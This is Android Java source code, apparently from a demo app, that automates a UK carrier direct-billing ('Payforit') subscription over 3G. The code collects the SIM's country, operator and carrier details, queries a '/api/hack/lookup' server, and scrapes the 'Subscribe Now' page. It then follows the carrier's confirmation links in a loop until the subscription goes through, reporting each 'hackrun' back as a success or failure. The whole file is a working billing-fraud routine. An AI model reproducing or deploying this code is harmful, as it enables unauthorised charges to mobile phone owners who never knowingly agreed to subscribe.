package com.dcbsecure.demo201503.dcbsecure.flow;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.R;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowUK3G implements View.OnClickListener, DialogInterface.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;
    private final String trigger;
    private PayforitDialog payforitDialog;

    public FlowUK3G(ActivityMainWindow activityMainWindow, String trigger)
    {
        this.activityMainWindow = activityMainWindow;
        this.trigger = trigger;
    }

    public FlowUK3G(ActivityMainWindow activityMainWindow, String trigger, PayforitDialog payforitDialog)
    {
        this.activityMainWindow = activityMainWindow;
        this.trigger = trigger;
        this.payforitDialog = payforitDialog;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }

    @Override
    public void onClick(DialogInterface dialog, int which)
    {
        payforitDialog = new PayforitDialog(activityMainWindow, trigger);
        payforitDialog.show();
    }

    private void onClick()
    {
        Log.d("FLIRTY", "Started handling payment over 3G");


        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        final ProgressDialog progress = ProgressDialog.show(activityMainWindow, null, activityMainWindow.getString(R.string.processing));
        progress.show();

        // used to dismiss the progress dialog
        final Handler handler = new Handler()
        {
            @Override
            public void handleMessage(final Message msg)
            {
                super.handleMessage(msg);

                if (msg.what == 0)
                {
                    progress.dismiss();
                    payforitDialog.dismiss();
                }

                if(msg.what >0)
                {
                    // start the waiting task
                    progress.setMessage(activityMainWindow.getString(R.string.processing)+" "+msg.what+"%");
                }
            }
        };

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    //reset pin
                    FlowUtil.setPin(null);

                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);

                    if (hackConfigResponse == null)
                    {
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else if(hackConfigResponse.has("ref"))
                    {
                        //subscription ON! => grant access

                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, false, "hack started but config says sub is ON (access granted)", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(deviceid, runid, handler);
                    }
                }
                catch (JSONException e)
                {
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    Log.d("FLIRTY", "Could not read hack config");
                    handler.sendEmptyMessage(0);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
                    handler.sendEmptyMessage(0);
                }

            }
        }).start();
    }


    private void runFlowNotInMainThread(final String deviceid, final long runid, final Handler handler)
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl = null;
        JSONObject billingConfigJSON = ConfigMgr.getBillingConfig();

        try
        {
            JSONObject carrierSubFlow = null;

            if(billingConfigJSON != null && billingConfigJSON.has("carrier_sub_flow")) carrierSubFlow = billingConfigJSON.getJSONObject("carrier_sub_flow");
            if(carrierSubFlow != null && carrierSubFlow.has("start_url")) startUrl = carrierSubFlow.getString("start_url");

        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
            handler.sendEmptyMessage(0);
            return;
        }

        if (startUrl == null)
        {
            String subject = "cannot workout start_url";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
            handler.sendEmptyMessage(0);
            return;
        }
        else //if (startUrl!=null)
        {
            RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
            String serverUrl = resultAfterStart != null ? extractServerUrl(resultAfterStart.getUrl()) : null;
            String htmlDataAfterStart = resultAfterStart != null ? resultAfterStart.getContent() : null; // html content

            if (resultAfterStart == null)
            {
                String subject = "start_url returns nothing";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
                handler.sendEmptyMessage(0);
                return;
            }
            else if (resultAfterStart.getHttpCode() != 200)
            {
                String subject = "start_url returns http code " + resultAfterStart.getHttpCode();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
                handler.sendEmptyMessage(0);
                return;
            }
            else if (serverUrl == null)
            {
                String subject = "cannot workout server url from " + resultAfterStart.getUrl();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
                handler.sendEmptyMessage(0);
                return;
            }
            else if (htmlDataAfterStart != null && !htmlDataAfterStart.contains("Subscribe Now"))
            {
                String subject = "UK expected msisdn entry page does not look right (3G flow)";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
                handler.sendEmptyMessage(0);
                return;
            }
            else
            {
                doClickSubscribe(deviceid,runid,activityMainWindow,serverUrl,userAgent,htmlDataAfterStart,handler);
            }

        }

    }

    public static void doClickSubscribe(String deviceid, long runid, ActivityMainWindow activityMainWindow, String serverUrl, String userAgent, String htmlDataAfterStart, Handler handler)
    {
        RequestResult resultAfterConfirm = null;
        String htmlDataAfterConfirm = null;

        String checkUrl = extractSubscribeUrl(htmlDataAfterStart,serverUrl);

        final long WAITING_TIME = 130000;
        final long END_TIME = System.currentTimeMillis() + WAITING_TIME;

        while (checkUrl!=null && System.currentTimeMillis() <= END_TIME)
        {
            resultAfterConfirm = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, checkUrl, userAgent);
            htmlDataAfterConfirm = resultAfterConfirm != null ? resultAfterConfirm.getContent() : null;

            checkUrl = extractSubscribeUrl(htmlDataAfterConfirm,serverUrl);
            if(checkUrl==null) break;

            //loop waiting while subscription setup is being processed by the carrier
            try
            {
                double timeElapsedPer95 = 95d - ( 95d * (END_TIME- System.currentTimeMillis()) / WAITING_TIME) ;
                int progressPercent = 5 + (int) Math.round(timeElapsedPer95);
                handler.sendEmptyMessage(progressPercent);

                Thread.sleep(5000); //5 sec
            }
            catch (InterruptedException ex)
            {
                Thread.currentThread().interrupt();
            }

        }

        if (resultAfterConfirm==null || htmlDataAfterConfirm==null)
        {
            String subject = "Subscription setup check returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            handler.sendEmptyMessage(0);
            return;
        }
        else if(System.currentTimeMillis() > END_TIME && checkUrl!=null)
        {
            String subject = "Timeout whilst subscription setup is being processed by the carrier";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            handler.sendEmptyMessage(0);
            return;
        }
        else if(htmlDataAfterConfirm.toLowerCase().contains("payment received"))
        {
            String subject = "successful signup after pin confirm (UK wifi flow)";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            handler.sendEmptyMessage(0);
            return;
        }
        else//passed (possibly)
        {

            RequestResult followRedirect = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, resultAfterConfirm.getUrl(), userAgent);
            final String followRedirectUrl = followRedirect != null ? followRedirect.getUrl() : null;
            final String htmlDataAfterFollowRedirect = followRedirect != null ? followRedirect.getContent() : null;

            if (followRedirectUrl != null && followRedirectUrl.contains("flirtymob.com"))
            {
                String subject = "successful signup (UK 3G flow)";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            }
            else
            {
                String subject = "expected redirection after signup does not look right (UK 3G flow)";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            }

            handler.sendEmptyMessage(0);
            return;

        }
    }

    private static String extractSubscribeUrl(String htmlData, String serverPath)
    {
        if(htmlData!=null && htmlData.contains("/check\">click here</a>"))
        {
            Pattern pattern = Pattern.compile("<a href=\"(/web_subscriptions/.*/check)\">click here</a>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return serverPath+matcher.group(1);
        }

        return null;
    }

    private static String extractServerUrl(String url)
    {
        //landingUrlAfterStart might look like http://migpay.com/web_subscriptions/4R5BAJ/enter_code = > extract http://migpay.com
        int indexEndOfServer = url.indexOf("/", 7); //start searching after http:// to find the first /
        return url.substring(0, indexEndOfServer);
    }

}
